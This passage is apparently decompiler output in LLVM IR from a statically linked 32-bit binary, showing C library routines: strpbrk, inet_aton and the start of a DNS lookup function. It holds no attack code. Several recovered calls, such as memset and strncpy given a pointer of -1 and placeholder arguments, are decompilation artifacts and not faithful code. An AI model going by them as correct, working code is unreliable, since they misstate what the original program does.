  br label %dec_label_pc_8055f51

dec_label_pc_8055f4d:                             ; preds = %dec_label_pc_8055f2e
  %v9_8055f32 = inttoptr i32 %v8_8055f32 to i8*
  store i8 0, i8* %v9_8055f32, align 1
  %v2_8055f50 = add i32 %v8_8055f32, 1
  br label %dec_label_pc_8055f51

dec_label_pc_8055f51:                             ; preds = %dec_label_pc_8055f3e, %dec_label_pc_8055f4d
  %storemerge = phi i32 [ %v2_8055f50, %dec_label_pc_8055f4d ], [ %v8_8055f43, %dec_label_pc_8055f3e ]
  %v0_8055f51 = phi i32 [ %v2_8055f50, %dec_label_pc_8055f4d ], [ %v8_8055f43, %dec_label_pc_8055f3e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055f51 = load i32, i32* @esi, align 4
  %v2_8055f51 = inttoptr i32 %v1_8055f51 to i32*
  store i32 %v0_8055f51, i32* %v2_8055f51, align 4
  %v0_8055f53 = load i32, i32* @ebx, align 4
  store i32 %v0_8055f53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f55

dec_label_pc_8055f55:                             ; preds = %dec_label_pc_8055f28, %dec_label_pc_8055f51
  %v0_8055f58 = phi i32 [ %v0_8055f58.pre, %dec_label_pc_8055f28 ], [ %v0_8055f53, %dec_label_pc_8055f51 ]
  %v2_8055f55 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055f55, i32* @ebx, align 4
  store i32 %v0_8055f01, i32* @esi, align 4
  store i32 %v0_8055f00, i32* @edi, align 4
  ret i32 %v0_8055f58

; uselistorder directives
  uselistorder i32 %v8_8055f32, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055f55, { 1, 0 }
  uselistorder label %dec_label_pc_8055f51, { 1, 0 }
  uselistorder label %dec_label_pc_8055f15, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055f5d = load i32, i32* @ebx, align 4
  %v2_8055f7425 = load i8, i8* %arg1, align 1
  %v4_8055f7629 = icmp eq i8 %v2_8055f7425, 0
  br i1 %v4_8055f7629, label %dec_label_pc_8055f7e, label %dec_label_pc_8055f7a.lr.ph

dec_label_pc_8055f7a.lr.ph:                       ; preds = %entry
  %v3_8055f7426 = zext i8 %v2_8055f7425 to i32
  %v5_8055f7427 = and i32 %v0_8055f5d, -256
  %v6_8055f7428 = or i32 %v3_8055f7426, %v5_8055f7427
  %v4_8055f62 = ptrtoint i8* %arg1 to i32
  %v1_8055f6d13 = inttoptr i32 %arg2 to i8*
  %v4_8055f6d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055f7a

dec_label_pc_8055f68:                             ; preds = %dec_label_pc_8055f7a, %dec_label_pc_8055f6c
  %v6_8055f6d23 = phi i32 [ %v6_8055f6d, %dec_label_pc_8055f6c ], [ %v6_8055f6d17, %dec_label_pc_8055f7a ]
  %v2_8055f6d22 = phi i8 [ %v2_8055f6d, %dec_label_pc_8055f6c ], [ %v2_8055f6d14, %dec_label_pc_8055f7a ]
  %v0_8055f6c21 = phi i32 [ %v1_8055f6c, %dec_label_pc_8055f6c ], [ %arg2, %dec_label_pc_8055f7a ]
  %v15_8055f68 = icmp eq i8 %v2_8055f6d22, %v2_8055f7433
  br i1 %v15_8055f68, label %dec_label_pc_8055f80, label %dec_label_pc_8055f6c

dec_label_pc_8055f6c:                             ; preds = %dec_label_pc_8055f68
  %v1_8055f6c = add i32 %v0_8055f6c21, 1
  store i32 %v1_8055f6c, i32* @edx, align 4
  %v1_8055f6d = inttoptr i32 %v1_8055f6c to i8*
  %v2_8055f6d = load i8, i8* %v1_8055f6d, align 1
  %v3_8055f6d = zext i8 %v2_8055f6d to i32
  %v5_8055f6d = and i32 %v6_8055f6d23, -256
  %v6_8055f6d = or i32 %v3_8055f6d, %v5_8055f6d
  store i32 %v6_8055f6d, i32* @ecx, align 4
  %v4_8055f6f = icmp eq i8 %v2_8055f6d, 0
  %v1_8055f71 = icmp eq i1 %v4_8055f6f, false
  br i1 %v1_8055f71, label %dec_label_pc_8055f68, label %dec_label_pc_8055f73

dec_label_pc_8055f73:                             ; preds = %dec_label_pc_8055f6c, %dec_label_pc_8055f7a
  %v4_8055f6d.pre36 = phi i32 [ %v6_8055f6d17, %dec_label_pc_8055f7a ], [ %v6_8055f6d, %dec_label_pc_8055f6c ]
  %v1_8055f73 = add i32 %v0_8055f7331, 1
  %v1_8055f74 = inttoptr i32 %v1_8055f73 to i8*
  %v2_8055f74 = load i8, i8* %v1_8055f74, align 1
  %v3_8055f74 = zext i8 %v2_8055f74 to i32
  %v5_8055f74 = and i32 %v6_8055f7434, -256
  %v6_8055f74 = or i32 %v3_8055f74, %v5_8055f74
  %v4_8055f76 = icmp eq i8 %v2_8055f74, 0
  br i1 %v4_8055f76, label %dec_label_pc_8055f7e, label %dec_label_pc_8055f7a

dec_label_pc_8055f7a:                             ; preds = %dec_label_pc_8055f7a.lr.ph, %dec_label_pc_8055f73
  %v4_8055f6d.pre = phi i32 [ %v4_8055f6d.pre.pre, %dec_label_pc_8055f7a.lr.ph ], [ %v4_8055f6d.pre36, %dec_label_pc_8055f73 ]
  %v6_8055f7434 = phi i32 [ %v6_8055f7428, %dec_label_pc_8055f7a.lr.ph ], [ %v6_8055f74, %dec_label_pc_8055f73 ]
  %v2_8055f7433 = phi i8 [ %v2_8055f7425, %dec_label_pc_8055f7a.lr.ph ], [ %v2_8055f74, %dec_label_pc_8055f73 ]
  %v0_8055f7331 = phi i32 [ %v4_8055f62, %dec_label_pc_8055f7a.lr.ph ], [ %v1_8055f73, %dec_label_pc_8055f73 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055f6d14 = load i8, i8* %v1_8055f6d13, align 1
  %v3_8055f6d15 = zext i8 %v2_8055f6d14 to i32
  %v5_8055f6d16 = and i32 %v4_8055f6d.pre, -256
  %v6_8055f6d17 = or i32 %v3_8055f6d15, %v5_8055f6d16
  store i32 %v6_8055f6d17, i32* @ecx, align 4
  %v4_8055f6f18 = icmp eq i8 %v2_8055f6d14, 0
  %v1_8055f7120 = icmp eq i1 %v4_8055f6f18, false
  br i1 %v1_8055f7120, label %dec_label_pc_8055f68, label %dec_label_pc_8055f73

dec_label_pc_8055f7e:                             ; preds = %dec_label_pc_8055f73, %entry
  br label %dec_label_pc_8055f80

dec_label_pc_8055f80:                             ; preds = %dec_label_pc_8055f68, %dec_label_pc_8055f7e
  %v0_8055f82 = phi i32 [ 0, %dec_label_pc_8055f7e ], [ %v0_8055f7331, %dec_label_pc_8055f68 ]
  store i32 %v0_8055f5d, i32* @ebx, align 4
  ret i32 %v0_8055f82

; uselistorder directives
  uselistorder i32 %v6_8055f6d17, { 2, 0, 1 }
  uselistorder i8 %v2_8055f6d14, { 1, 2, 0 }
  uselistorder i32 %v1_8055f73, { 1, 0 }
  uselistorder i32 %v6_8055f6d, { 1, 2, 0 }
  uselistorder i8 %v2_8055f6d, { 1, 2, 0 }
  uselistorder i32 %v1_8055f6c, { 2, 1, 0 }
  uselistorder i8 %v2_8055f7425, { 0, 2, 1 }
  uselistorder i32 %v0_8055f5d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055f80, { 1, 0 }
  uselistorder label %dec_label_pc_8055f7a, { 1, 0 }
  uselistorder label %dec_label_pc_8055f73, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8055f8b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055f8b, i32* @ecx, align 4
  %v1_8055f8f = icmp eq i8* %arg1, null
  br i1 %v1_8055f8f, label %dec_label_pc_8056010, label %dec_label_pc_8055f93

dec_label_pc_8055f93:                             ; preds = %entry
  %v0_8055f9e.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8055f9e

dec_label_pc_8055f9e:                             ; preds = %dec_label_pc_8055f93, %dec_label_pc_8055fe7
  %v2_8055fe734 = phi i32 [ 1, %dec_label_pc_8055f93 ], [ %v3_8055fe7, %dec_label_pc_8055fe7 ]
  %v0_8055fa433 = phi i32 [ %v4_8055f8b, %dec_label_pc_8055f93 ], [ %v0_8055fa43, %dec_label_pc_8055fe7 ]
  %v0_805600532 = phi i32 [ 0, %dec_label_pc_8055f93 ], [ %v2_8055fed, %dec_label_pc_8055fe7 ]
  %v1_8055fa4 = inttoptr i32 %v0_8055fa433 to i8*
  %v2_8055fa4 = load i8, i8* %v1_8055fa4, align 1
  %v3_8055fa4 = sext i8 %v2_8055fa4 to i32
  %v2_8055fa7 = mul nsw i32 %v3_8055fa4, 2
  %v3_8055fa7 = add i32 %v2_8055fa7, %v0_8055f9e.pre
  %v4_8055fa7 = inttoptr i32 %v3_8055fa7 to i8*
  %v5_8055fa7 = load i8, i8* %v4_8055fa7, align 1
  %v6_8055fa7 = and i8 %v5_8055fa7, 8
  %v7_8055fa7 = icmp eq i8 %v6_8055fa7, 0
  br i1 %v7_8055fa7, label %dec_label_pc_8056010, label %dec_label_pc_8055fae

dec_label_pc_8055fae:                             ; preds = %dec_label_pc_8055f9e
  %v4_8055fc2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055fc2

dec_label_pc_8055fb2:                             ; preds = %dec_label_pc_8055fc2
  %v3_8055fb2 = mul i32 %v1_8055fb2, 10
  %v2_8055fb5 = add i32 %v3_8055fb2, -48
  %v3_8055fb5 = add i32 %v2_8055fb5, %v2_8055fc4
  %v1_8055fb9 = add i32 %v3_8055fb5, -255
  %v6_8055fb9 = sub i32 254, %v3_8055fb5
  %v7_8055fb9 = and i32 %v6_8055fb9, %v3_8055fb5
  %v8_8055fb9 = icmp slt i32 %v7_8055fb9, 0
  %v9_8055fb9 = icmp eq i32 %v1_8055fb9, 0
  %v10_8055fb9 = icmp slt i32 %v1_8055fb9, 0
  %v3_8055fbf = icmp eq i1 %v10_8055fb9, %v8_8055fb9
  %v4_8055fbf = icmp eq i1 %v9_8055fb9, false
  %v5_8055fbf = and i1 %v4_8055fbf, %v3_8055fbf
  br i1 %v5_8055fbf, label %dec_label_pc_8056010, label %dec_label_pc_8055fc1

dec_label_pc_8055fc1:                             ; preds = %dec_label_pc_8055fb2
  %v1_8055fc1 = add i32 %v0_8055fc1, 1
  store i32 %v1_8055fc1, i32* @ecx, align 4
  br label %dec_label_pc_8055fc2

dec_label_pc_8055fc2:                             ; preds = %dec_label_pc_8055fae, %dec_label_pc_8055fc1
  %v1_8055fb2 = phi i32 [ 0, %dec_label_pc_8055fae ], [ %v3_8055fb5, %dec_label_pc_8055fc1 ]
  %v4_8055fc2 = phi i32 [ %v4_8055fc2.pre, %dec_label_pc_8055fae ], [ %v6_8055fc2, %dec_label_pc_8055fc1 ]
  %v0_8055fc1 = phi i32 [ %v0_8055fa433, %dec_label_pc_8055fae ], [ %v1_8055fc1, %dec_label_pc_8055fc1 ]
  %v1_8055fc2 = inttoptr i32 %v0_8055fc1 to i8*
  %v2_8055fc2 = load i8, i8* %v1_8055fc2, align 1
  %v3_8055fc2 = zext i8 %v2_8055fc2 to i32
  %v5_8055fc2 = and i32 %v4_8055fc2, -256
  %v6_8055fc2 = or i32 %v3_8055fc2, %v5_8055fc2
  store i32 %v6_8055fc2, i32* @edx, align 4
  %v2_8055fc4 = sext i8 %v2_8055fc2 to i32
  %v2_8055fc7 = mul nsw i32 %v2_8055fc4, 2
  %v3_8055fc7 = add i32 %v2_8055fc7, %v0_8055f9e.pre
  %v4_8055fc7 = inttoptr i32 %v3_8055fc7 to i16*
  %v5_8055fc7 = load i16, i16* %v4_8055fc7, align 2
  %v2_8055fcc = and i16 %v5_8055fc7, 8
  %v3_8055fcc = icmp eq i16 %v2_8055fcc, 0
  %v1_8055fce = icmp eq i1 %v3_8055fcc, false
  br i1 %v1_8055fce, label %dec_label_pc_8055fb2, label %dec_label_pc_8055fd0

dec_label_pc_8055fd0:                             ; preds = %dec_label_pc_8055fc2
  %v8_8055fd0 = sub nsw i32 2, %v2_8055fe734
  %v9_8055fd0 = and i32 %v8_8055fd0, %v2_8055fe734
  %v10_8055fd0 = icmp slt i32 %v9_8055fd0, 0
  %v11_8055fd0 = icmp eq i32 %v2_8055fe734, 3
  %v12_8055fd0 = icmp slt i32 %v2_8055fe734, 3
  %v3_8055fd4 = icmp eq i1 %v12_8055fd0, %v10_8055fd0
  %v4_8055fd4 = icmp eq i1 %v11_8055fd0, false
  %v5_8055fd4 = and i1 %v4_8055fd4, %v3_8055fd4
  br i1 %v5_8055fd4, label %dec_label_pc_8055fde, label %dec_label_pc_8055fd6

dec_label_pc_8055fd6:                             ; preds = %dec_label_pc_8055fd0
  %v10_8055fd6 = icmp eq i8 %v2_8055fc2, 46
  %v1_8055fd9 = icmp eq i1 %v10_8055fd6, false
  br i1 %v1_8055fd9, label %dec_label_pc_8056010, label %dec_label_pc_8055fdb

dec_label_pc_8055fdb:                             ; preds = %dec_label_pc_8055fd6
  %v1_8055fdb = add i32 %v0_8055fc1, 1
  store i32 %v1_8055fdb, i32* @ecx, align 4
  br label %dec_label_pc_8055fe7

dec_label_pc_8055fde:                             ; preds = %dec_label_pc_8055fd0
  %v1_8055fde = add i32 %v0_8055fc1, 1
  store i32 %v1_8055fde, i32* @ecx, align 4
  %v4_8055fdf = icmp eq i8 %v2_8055fc2, 0
  br i1 %v4_8055fdf, label %dec_label_pc_8055fe7, label %dec_label_pc_8055fe3

dec_label_pc_8055fe3:                             ; preds = %dec_label_pc_8055fde
  %v2_8055fe3 = and i16 %v5_8055fc7, 32
  %v3_8055fe3 = icmp eq i16 %v2_8055fe3, 0
  br i1 %v3_8055fe3, label %dec_label_pc_8056010, label %dec_label_pc_8055fe7

dec_label_pc_8055fe7:                             ; preds = %dec_label_pc_8055fe3, %dec_label_pc_8055fde, %dec_label_pc_8055fdb
  %v0_8055fa43 = phi i32 [ %v1_8055fde, %dec_label_pc_8055fe3 ], [ %v1_8055fde, %dec_label_pc_8055fde ], [ %v1_8055fdb, %dec_label_pc_8055fdb ]
  %v3_8055fe7 = add nuw nsw i32 %v2_8055fe734, 1
  %v2_8055fea = mul i32 %v0_805600532, 256
  %v2_8055fed = or i32 %v1_8055fb2, %v2_8055fea
  %v7_8055ff3 = icmp sgt i32 %v2_8055fe734, 3
  br i1 %v7_8055ff3, label %dec_label_pc_8055ff5, label %dec_label_pc_8055f9e

dec_label_pc_8055ff5:                             ; preds = %dec_label_pc_8055fe7
  %v4_8055ff5 = icmp eq i32 %arg2, 0
  br i1 %v4_8055ff5, label %dec_label_pc_8056012, label %dec_label_pc_8056001

dec_label_pc_8056001:                             ; preds = %dec_label_pc_8055ff5
  %v1_8056005 = call i32 @llvm.bswap.i32(i32 %v2_8055fed)
  %v2_8056007 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8056005, i32* %v2_8056007, align 4
  br label %dec_label_pc_8056012

dec_label_pc_8056010:                             ; preds = %dec_label_pc_8055fe3, %dec_label_pc_8055fd6, %dec_label_pc_8055f9e, %dec_label_pc_8055fb2, %entry
  br label %dec_label_pc_8056012

dec_label_pc_8056012:                             ; preds = %dec_label_pc_8055ff5, %dec_label_pc_8056001, %dec_label_pc_8056010
  %v0_8056017 = phi i32 [ 1, %dec_label_pc_8055ff5 ], [ 1, %dec_label_pc_8056001 ], [ 0, %dec_label_pc_8056010 ]
  ret i32 %v0_8056017

; uselistorder directives
  uselistorder i32 %v2_8055fc4, { 1, 0 }
  uselistorder i32 %v6_8055fc2, { 1, 0 }
  uselistorder i8 %v2_8055fc2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055fc1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8055fb9, { 1, 0 }
  uselistorder i32 %v3_8055fb5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055fa433, { 1, 0 }
  uselistorder i32 %v2_8055fe734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056012, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056010, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8055fc2, { 1, 0 }
  uselistorder label %dec_label_pc_8055f9e, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805602e = call i32 @malloc(i32 512)
  store i32 %v2_805602e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805602e, i32* @ebp, align 4
  %v2_805603c = call i32 @malloc(i32 1025)
  store i32 %v2_805603c, i32* %eax.global-to-local, align 4
  %v12_8056045 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8056048 = icmp eq i32 %v2_805602e, 0
  br i1 %v1_8056048, label %dec_label_pc_80566c1, label %dec_label_pc_8056050

dec_label_pc_8056050:                             ; preds = %entry
  %v1_8056050 = icmp eq i32 %v2_805603c, 0
  br i1 %v1_8056050, label %dec_label_pc_80566c1, label %dec_label_pc_8056058

dec_label_pc_8056058:                             ; preds = %dec_label_pc_8056050
  %v5_8056058 = icmp eq i32 %arg2, 0
  br i1 %v5_8056058, label %dec_label_pc_80566c1, label %dec_label_pc_8056066

dec_label_pc_8056066:                             ; preds = %dec_label_pc_8056058
  %v4_8056066 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056066, i32* %eax.global-to-local, align 4
  %v2_805606d = load i8, i8* %arg1, align 1
  %v3_805606d = icmp eq i8 %v2_805606d, 0
  br i1 %v3_805606d, label %dec_label_pc_80566c1, label %dec_label_pc_8056076

dec_label_pc_8056076:                             ; preds = %dec_label_pc_8056066
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_805607a = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_805607a, i32* @eax, align 4
  store i32 %v4_8056066, i32* %edx.global-to-local, align 4
  %v2_805609d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_805609d, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80560a5 = call i32 @__pthread_return_void(i32 %v2_805609d, i32 134565087)
  store i32 %v3_80560a5, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80617a8.550 to i8*), i8** %stack_var_-252, align 4
  %v2_80560b1 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80617a8.550 to i32))
  %v0_80560b6 = load i64, i64* @global_var_80617c0.551, align 8
  %v1_80560b6 = trunc i64 %v0_80560b6 to i32
  %v1_80560bb = ashr i32 %v1_80560b6, 31
  %v6_80560bc = and i64 %v0_80560b6, 4294967295
  %v8_80560bc = zext i32 %v1_80560bb to i64
  %v9_80560bc = mul nuw i64 %v8_80560bc, 4294967296
  %v10_80560bc = or i64 %v9_80560bc, %v6_80560bc
  %v14_80560bc = srem i64 %v10_80560bc, %tmp33
  %v15_80560bc = trunc i64 %v14_80560bc to i32
  %v0_80560c3 = load i16, i16* @global_var_805b504.552, align 4
  %v2_80560d2 = load i8*, i8** %stack_var_-252, align 4
  %v3_80560d2 = ptrtoint i8* %v2_80560d2 to i32
  store i32 %v3_80560d2, i32* @eax, align 4
  store i32 134565087, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80560d7 = call i32 @__pthread_return_void(i32 %v2_805609d, i32 1)
  store i32 %v3_80560d7, i32* %eax.global-to-local, align 4
  %v4_805627e = inttoptr i32 %v15_80560bc to i8*
  %v1_805669c72 = add i32 %v12_8056045, 28
  %v2_805669c73 = inttoptr i32 %v1_805669c72 to i32*
  %v3_805669c74 = load i32, i32* %v2_805669c73, align 4
  %tmp = icmp ult i32 %v3_805669c74, 3
  br i1 %tmp, label %dec_label_pc_80560fc, label %dec_label_pc_80566c1

dec_label_pc_80560fc:                             ; preds = %dec_label_pc_8056076, %dec_label_pc_805669c.backedge
  %v0_805610383 = phi i32 [ %v0_805669c.pre, %dec_label_pc_805669c.backedge ], [ %v12_8056045, %dec_label_pc_8056076 ]
  %v1_80560fc = add i32 %v0_805610383, 20
  %v2_80560fc = inttoptr i32 %v1_80560fc to i32*
  %v3_80560fc = load i32, i32* %v2_80560fc, align 4
  %v13_80560fc = icmp eq i32 %v3_80560fc, -1
  br i1 %v13_80560fc, label %dec_label_pc_80560fc.dec_label_pc_8056112_crit_edge, label %dec_label_pc_8056103

dec_label_pc_80560fc.dec_label_pc_8056112_crit_edge: ; preds = %dec_label_pc_80560fc
  %v0_8056112.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056112

dec_label_pc_8056103:                             ; preds = %dec_label_pc_80560fc
  %v3_8056106 = load i32, i32* %v2_80560fc, align 4
  %v5_8056106 = add i32 %v0_805610383, -16
  %v6_8056106 = inttoptr i32 %v5_8056106 to i32*
  store i32 %v3_8056106, i32* %v6_8056106, align 4
  %v1_805610a = call i32 @__libc_close(i32 -1)
  store i32 %v1_805610a, i32* %eax.global-to-local, align 4
  %v0_805610f = load i32, i32* @esp, align 4
  %v1_805610f = add i32 %v0_805610f, 16
  br label %dec_label_pc_8056112

dec_label_pc_8056112:                             ; preds = %dec_label_pc_80560fc.dec_label_pc_8056112_crit_edge, %dec_label_pc_8056103
  %v1_8056112 = phi i32 [ %v0_805610383, %dec_label_pc_80560fc.dec_label_pc_8056112_crit_edge ], [ %v1_805610f, %dec_label_pc_8056103 ]
  %v0_8056112 = phi i32 [ %v0_8056112.pre, %dec_label_pc_80560fc.dec_label_pc_8056112_crit_edge ], [ %v1_805610a, %dec_label_pc_8056103 ]
  %v2_8056112 = add i32 %v1_8056112, -4
  %v3_8056112 = inttoptr i32 %v2_8056112 to i32*
  store i32 %v0_8056112, i32* %v3_8056112, align 4
  %v1_8056113 = add i32 %v1_8056112, -8
  %v2_8056113 = inttoptr i32 %v1_8056113 to i32*
  store i32 512, i32* %v2_8056113, align 4
  %v1_8056118 = add i32 %v1_8056112, -12
  %v2_8056118 = inttoptr i32 %v1_8056118 to i32*
  store i32 0, i32* %v2_8056118, align 4
  %v2_805611a = add i32 %v1_8056112, -16
  %v3_805611a = inttoptr i32 %v2_805611a to i32*
  store i32 %v2_805602e, i32* %v3_805611a, align 4
  %v4_805611b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805611b, i32* %eax.global-to-local, align 4
  %v0_8056120 = load i32, i32* @esp, align 4
  %v1_8056123 = add i32 %v0_8056120, 8
  %v2_8056123 = inttoptr i32 %v1_8056123 to i32*
  store i32 48, i32* %v2_8056123, align 4
  %v1_8056125 = add i32 %v0_8056120, 4
  %v2_8056125 = inttoptr i32 %v1_8056125 to i32*
  store i32 0, i32* %v2_8056125, align 4
  %v1_8056127 = add i32 %v0_8056120, 84
  store i32 %v1_8056127, i32* @ebx, align 4
  %v3_805612b = inttoptr i32 %v0_8056120 to i32*
  store i32 %v1_8056127, i32* %v3_805612b, align 4
  %v4_805612c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805612c, i32* %eax.global-to-local, align 4
  %v0_8056131 = load i32, i32* @esp, align 4
  %v1_8056131 = add i32 %v0_8056131, 72
  %v2_8056131 = inttoptr i32 %v1_8056131 to i32*
  %v3_8056131 = load i32, i32* %v2_8056131, align 4
  store i32 %v3_8056131, i32* %eax.global-to-local, align 4
  %v1_8056135 = add i32 %v0_8056131, 116
  %v2_8056135 = inttoptr i32 %v1_8056135 to i32*
  store i32 1, i32* %v2_8056135, align 4
  %v0_805613d = load i32, i32* @esp, align 4
  %v1_805613d = add i32 %v0_805613d, 104
  %v2_805613d = inttoptr i32 %v1_805613d to i32*
  store i32 1, i32* %v2_805613d, align 4
  %v0_8056145 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056145 = add i32 %v0_8056145, 1
  %v1_8056146 = urem i32 %v1_8056145, 65536
  store i32 %v1_8056146, i32* %eax.global-to-local, align 4
  %v1_805614b = load i32, i32* @esp, align 4
  %v2_805614b = add i32 %v1_805614b, 72
  %v3_805614b = inttoptr i32 %v2_805614b to i32*
  store i32 %v1_8056146, i32* %v3_805614b, align 4
  %v0_805614f = load i32, i32* %eax.global-to-local, align 4
  %v1_805614f = load i32, i32* @esp, align 4
  %v2_805614f = add i32 %v1_805614f, 84
  %v3_805614f = inttoptr i32 %v2_805614f to i32*
  store i32 %v0_805614f, i32* %v3_805614f, align 4
  %v0_8056153 = load i32, i32* @esp, align 4
  %v1_8056156 = add i32 %v0_8056153, 8
  %v2_8056156 = inttoptr i32 %v1_8056156 to i32*
  store i32 512, i32* %v2_8056156, align 4
  %v2_805615b = add i32 %v0_8056153, 4
  %v3_805615b = inttoptr i32 %v2_805615b to i32*
  store i32 %v2_805602e, i32* %v3_805615b, align 4
  %v0_805615c = load i32, i32* @ebx, align 4
  %v3_805615c = inttoptr i32 %v0_8056153 to i32*
  store i32 %v0_805615c, i32* %v3_805615c, align 4
  %v0_805615d = call i32 @__encode_header()
  store i32 %v0_805615d, i32* %eax.global-to-local, align 4
  %v0_8056162 = load i32, i32* @esp, align 4
  %v2_8056165 = icmp slt i32 %v0_805615d, 0
  store i32 %v0_805615d, i32* @ebx, align 4
  br i1 %v2_8056165, label %dec_label_pc_80566c1, label %dec_label_pc_805616f

dec_label_pc_805616f:                             ; preds = %dec_label_pc_8056112
  %v2_805616f = add i32 %v0_8056162, 12
  %v3_805616f = inttoptr i32 %v2_805616f to i32*
  store i32 %v0_805615d, i32* %v3_805616f, align 4
  %v1_8056170 = add i32 %v0_8056162, 8
  %v2_8056170 = inttoptr i32 %v1_8056170 to i32*
  store i32 1025, i32* %v2_8056170, align 4
  %v1_8056175 = add i32 %v0_8056162, 256
  %v2_8056175 = inttoptr i32 %v1_8056175 to i32*
  %v3_8056175 = load i32, i32* %v2_8056175, align 4
  %v5_8056175 = add i32 %v0_8056162, 4
  %v6_8056175 = inttoptr i32 %v5_8056175 to i32*
  store i32 %v3_8056175, i32* %v6_8056175, align 4
  %v1_805617c = add i32 %v0_8056162, 28
  %v2_805617c = inttoptr i32 %v1_805617c to i32*
  %v3_805617c = load i32, i32* %v2_805617c, align 4
  %v6_805617c = inttoptr i32 %v0_8056162 to i32*
  store i32 %v3_805617c, i32* %v6_805617c, align 4
  %v4_8056180 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  %v0_8056185 = load i32, i32* @esp, align 4
  %v1_8056188 = add i32 %v0_8056185, 8
  %v2_8056188 = inttoptr i32 %v1_8056188 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_8056188, align 4
  %v1_805618d = add i32 %v0_8056185, 4
  %v2_805618d = inttoptr i32 %v1_805618d to i32*
  store i32 134565087, i32* %v2_805618d, align 4
  %v1_8056192 = add i32 %v0_8056185, 200
  store i32 %v1_8056192, i32* @eax, align 4
  %v3_8056199 = inttoptr i32 %v0_8056185 to i32*
  store i32 %v1_8056192, i32* %v3_8056199, align 4
  %v2_805619a = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_805619a, i32* %eax.global-to-local, align 4
  %v0_805619f = load i32, i32* @esp, align 4
  %v1_805619f = inttoptr i32 %v0_805619f to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_805619f, align 4
  %v1_80561a6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80561a6, i32* %eax.global-to-local, align 4
  %v0_80561ab = load i32, i32* @esp, align 4
  %v1_80561ab = add i32 %v0_80561ab, 56
  %v2_80561ab = inttoptr i32 %v1_80561ab to i32*
  %v3_80561ab = load i32, i32* %v2_80561ab, align 4
  store i32 %v3_80561ab, i32* %edx.global-to-local, align 4
  %v1_80561af = add i32 %v0_80561ab, 268
  %v2_80561af = inttoptr i32 %v1_80561af to i32*
  %v3_80561af = load i32, i32* %v2_80561af, align 4
  store i32 %v3_80561af, i32* %eax.global-to-local, align 4
  %v2_80561b6 = mul i32 %v3_80561ab, 4
  %v3_80561b6 = add i32 %v3_80561af, %v2_80561b6
  %v4_80561b6 = inttoptr i32 %v3_80561b6 to i32*
  %v5_80561b6 = load i32, i32* %v4_80561b6, align 4
  store i32 %v5_80561b6, i32* %edx.global-to-local, align 4
  %v2_80561b9 = add i32 %v0_80561ab, 48
  %v3_80561b9 = inttoptr i32 %v2_80561b9 to i32*
  store i32 %v5_80561b6, i32* %v3_80561b9, align 4
  %v0_80561bd = load i32, i32* @esp, align 4
  %v1_80561bd = add i32 %v0_80561bd, 16
  %v1_80561c0 = add i32 %v0_80561bd, 52
